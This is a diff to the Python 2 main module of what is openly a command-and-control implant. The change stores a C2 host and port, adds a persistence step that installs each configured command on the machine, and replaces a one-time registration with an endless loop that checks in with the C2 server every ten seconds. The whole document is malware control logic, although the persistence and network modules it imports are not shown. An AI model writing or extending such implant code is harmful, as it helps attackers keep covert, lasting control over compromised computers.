@@ -1,8 +1,12 @@
-from os import sys, path
-sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
 import argparse
+from os import sys, path
+
+sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
 from .rest import ApiHelper
+from .lib.persistance import PersistenceMGMT
 from .db.SQLite import Helper
+from .settings import commands
+
 
 def parse_args():
     parser = argparse.ArgumentParser()
@@ -11,15 +15,33 @@ def parse_args():
     args = parser.parse_args()
     return args
 
+
 def main(args=None):
     db = Helper()
     args = parse_args()
+    config = False
     if args.host:
         db.set_config('c2_host', args.host)
     if args.port:
         db.set_config('c2_port', args.port)
+    init()
+    api_loop()
+
+
+def init():
+    def run():
+        persistence = PersistenceMGMT()
+        for command in commands:
+            print "[+] Persisting %s" % command
+            persistence.persist(command)
+    run()
+
+def api_loop():
+    from time import sleep
     api = ApiHelper()
-    api.register()
+    while True:
+        api.register()
+        sleep(10)
 
 
 if __name__ == "__main__":
